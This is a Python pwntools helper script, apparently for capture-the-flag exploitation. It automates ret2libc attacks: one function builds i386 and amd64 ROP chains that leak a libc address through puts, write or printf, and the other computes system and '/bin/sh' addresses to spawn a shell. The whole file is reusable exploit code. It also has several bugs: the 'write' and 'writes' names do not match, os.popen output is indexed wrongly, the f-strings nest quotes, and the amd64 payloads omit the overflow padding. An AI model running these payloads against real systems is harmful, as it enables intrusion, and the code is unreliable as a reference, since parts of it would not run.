from pwn import *
import os
def get_output(s):
    res = int(os.popen(s)[0][:-1],16)
    return res

def ret2libc_A(tool:str,to_leak:str,next:int,fill2ret,root="",fmt_str=0):
    """
    ** if you use printf as tool, you need to find fmt_str **
    for example: 
        use [puts](exec puts' plt) to show addr of [__malloc_hook]   
    """
    if tool not in ['puts','write','printf']:
        warning(f"I never use this func to leak addr of libc: {tool}")
        exit()
    if context.arch == 'i386':
        info("using i386 ret2libc auto...")
        psize = p32
        if tool == "puts":
            payload = fill2ret+psize(elf.plt[tool])+psize(next)+psize(elf.got[to_leak])
        elif tool == "writes":
            payload = fill2ret+psize(elf.plt[tool])+psize(next)+psize(1)+psize(elf.got[to_leak])+p32(4)
        elif tool == "printf":
            if not fmt_str:
                warning("fmt_str needed!")
                exit()
            payload = fill2ret+psize(elf.plt[tool])+psize(next)+psize(fmt_str)+psize(elf.got[to_leak])
        else:
            error("tool error!!!")
    elif context.arch == "amd64":
        info("using amd64 ret2libc auto...")
        psize = p64
        if not root:
            warning("root is needed to run ropgadget!")
            exit()
        pop_rdi_ret   =   get_output(f"ropgadget --binary {root} | grep 'pop rdi ; ret' | cut -d " " -f 1")
        pop_rsi_r15_ret = get_output(f"ropgadget --binary {root} | grep 'pop rsi ; pop r15 ; ret' | cut -d " " -f 1")
        if tool == "puts":
            payload = psize(pop_rdi_ret)+psize(elf.got[to_leak])+\
                      psize(elf.plt[tool])+psize(next)
        elif tool == "writes":
            payload = psize(pop_rdi_ret)+psize(1)+\
                      psize(pop_rsi_r15_ret)+psize(elf.got[to_leak])+psize(0)+\
                      psize(elf.plt[tool])+psize(next)
        elif tool == "printf":
            if not fmt_str:
                warning("fmt_str needed!")
                exit()
            payload = psize(pop_rdi_ret)+psize(fmt_str)+ \
                      psize(pop_rsi_r15_ret)+psize(elf.got[to_leak])+psize(0)+\
                      psize(elf.plt[tool])+psize(next)
    return payload

def ret2libc_B(to_leak:str,leak_addr,libc,fill2ret):
    """
    to_leak:    func_name
    leak_addr:  addr(int)
    libc:       ELF("libc-2.27.so")
    fill2ret:   payload cover ebp
    **use leaked address to get system & binsh**
    """
    psize = p32 if context.arch == 'i386' else p64
    libc_base = leak_addr - libc.symbols[to_leak]
    system = libc_base + libc.symbols['system']
    binsh  = libc_base + next(libc.search(b'/bin/sh'))
    payload = fill2ret + psize(system)+psize(0x12345678)+psize(binsh)
    return payload





